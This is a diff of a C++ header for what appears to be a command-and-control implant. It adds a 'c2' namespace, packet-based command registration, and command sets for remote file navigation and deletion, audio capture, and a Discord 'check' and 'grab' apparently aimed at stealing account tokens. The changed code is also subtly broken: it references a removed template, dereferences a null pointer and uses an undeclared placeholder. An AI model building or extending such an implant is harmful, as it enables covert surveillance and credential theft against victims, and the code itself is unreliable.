@@ -2,51 +2,52 @@
 #define COMMANDS_H
 
 #include <string>
-#include <vector>
 #include <memory>
+#include <vector>
 #include <iostream>
 #include <typeinfo>
 #include <typeindex>
 #include <functional>
 #include "controller.h"
+#include "packet.h"
 
-template<class...> struct X;
-template<class T, class... Args> struct X<T, Args...> {
-    static void build(std::vector<std::type_index>& list) {
-        list.push_back(typeid(T));
-        X<Args...>::build(list);
-    }
-};
-template<> struct X<> {
-    static void build(std::vector<std::type_index>& list) {}
-};
+namespace c2 {
+    template<class...> struct TypeEnumerator;
+    template<class T, class... Args> struct TypeEnumerator<T, Args...> {
+        static void build(std::vector<std::type_index>& list) {
+            list.push_back(typeid(T));
+            X<Args...>::build(list);
+        }
+    };
+    template<> struct TypeEnumerator<> {
+        static void build(std::vector<std::type_index>& list) {}
+    };
+}
 template<class... Args> void build_typeinfos(std::vector<std::type_index>& list) {
-    X<Args...>::build(list);
+    c2::TypeEnumerator<Args...>::build(list);
 }
 
-template<class... Args> void register_command(void(*builder)(Args...)) {
-    std::vector<std::type_index> types;
-    build_typeinfos<Args...>(types);
-    for (const auto& t : types) {
-        std::cout << t.name() << "\n";
-    }
+template<class... Args> void register_command(unsigned char type, std::unique_ptr<Packet>(*builder)(Args...)) {
+    std::unique_ptr<std::vector<std::type_index>> argtypes;
+    build_typeinfos<Args...>(*argtypes.get());
+    Packet::register_packet_type(type, std::bind(CommandPacket::build, _1, std::move(argtypes)));
 }
 
 class CommandPacket {
 public:
-	template<int type> static std::unique_ptr<Packet> build(std::vector<char>& data);
+    static std::unique_ptr<Packet> build(unsigned char type, std::unique_ptr<std::vector<std::type_index>> argtypes, std::vector<char>& data);
 };
 
 enum class NavigateCommand {
-	ls, cd, pwd, rm
+    ls, cd, pwd, rm
 };
 
 enum class AudioCommand {
-	start, stop, list
+    start, stop, list
 };
 
 enum class DiscordCommand {
-	check, grab
+    check, grab
 };
 
 // navigation
